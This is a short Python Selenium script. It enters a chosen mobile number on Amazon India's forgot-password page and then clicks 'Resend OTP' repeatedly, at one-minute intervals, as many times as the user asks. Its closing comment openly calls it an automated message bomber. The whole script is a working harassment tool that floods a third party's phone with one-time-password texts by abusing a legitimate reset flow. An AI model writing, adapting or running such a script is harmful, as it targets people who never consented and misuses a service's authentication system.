cd="C:\\Users\\Pranati\\Downloads\\chromedriver_win32 (1)\\chromedriver.exe"
import time
from selenium import webdriver
browser=webdriver.Chrome(cd)

browser.get("https://www.amazon.in/ap/forgotpassword?showRememberMe=true&openid.pape.max_auth_age=0&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&pageId=inflex&openid.return_to=https%3A%2F%2Fwww.amazon.in%2F%3Fref_%3Dnav_ya_signin&prevRID=08H1ZZR34JVH4PRDHPEE&openid.assoc_handle=inflex&openid.mode=checkid_setup&prepopulatedLoginId=eyJjaXBoZXIiOiJzWVJmSVN3a1gzVnZXQTNOM29XYXpnPT0iLCJ2ZXJzaW9uIjoxLCJJViI6IkhVVWZCcVdiVXNsd0ZXbHYvL0tuTlE9PSJ9&failedSignInCount=0&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0&timestamp=1617125854000")
un=browser.find_element_by_xpath('//input[@class="a-input-text a-span12 auth-required-field"]') #locate the element and click
un.send_keys(input("Enter Your Mobile Number")) #send your mobile number as input to that
time.sleep(5)
sign_in=browser.find_element_by_id('continue')
sign_in.click( )

n=int(input("Enter how many tym you want to resend the otp"))  #Enter the number how many time you want to resend otp
otp=browser.find_element_by_id('continue')
otp.click( )
time.sleep(2)
for i in range(n-1):
	time.sleep(60)
	resend=browser.find_element_by_link_text('Resend OTP')
	resend.click()
	print("Run")

#Here Our moto is to send otp to an user given mobile number as many times user wants,So It is an automated messege bomber.